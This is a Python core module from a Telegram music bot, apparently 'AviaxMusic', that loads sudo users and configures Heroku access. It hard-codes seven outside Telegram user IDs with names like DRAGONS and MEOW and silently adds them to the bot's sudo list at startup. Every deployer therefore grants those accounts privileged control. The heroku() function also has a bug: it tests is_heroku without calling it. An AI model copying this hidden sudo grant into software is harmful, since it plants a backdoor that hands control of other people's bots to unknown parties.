import socket
import time

import heroku3
from pyrogram import filters

import config
from AviaxMusic.core.mongo import mongodb

from .logging import LOGGER

SUDOERS = filters.user()

HAPP = None
_boot_ = time.time()






def is_heroku():
    return "heroku" in socket.getfqdn()


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(config.HEROKU_API_KEY),
    "https",
    str(config.HEROKU_APP_NAME),
    "HEAD",
    "master",
]


def dbb():
    global db
    db = {}
    LOGGER(__name__).info(f"Local Database Initialized.")


DRAGONS = 6777860063
DEV_USERS = 7335060704
DEMONS = 6397808634
MEOW = 7666460878

OWNER_ID = [DEV_USERS, DRAGONS, DEMONS, MEOW]

DEMON = 5500788786
DRAGON = 8164670581
DEV_USER = 6806897901

OFFICERS = [DEV_USER, DRAGON, DEMON]



async def sudo():
    global SUDOERS
    SUDOERS.update(OWNER_ID)
    SUDOERS.update(OFFICERS)
    LOGGER(__name__).info(f"Sudoers Loaded.")


def heroku():
    global HAPP
    if is_heroku:
        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
            try:
                Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                HAPP = Heroku.app(config.HEROKU_APP_NAME)
                LOGGER(__name__).info(f"Heroku App Configured")
            except BaseException:
                LOGGER(__name__).warning(
                    f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
                )
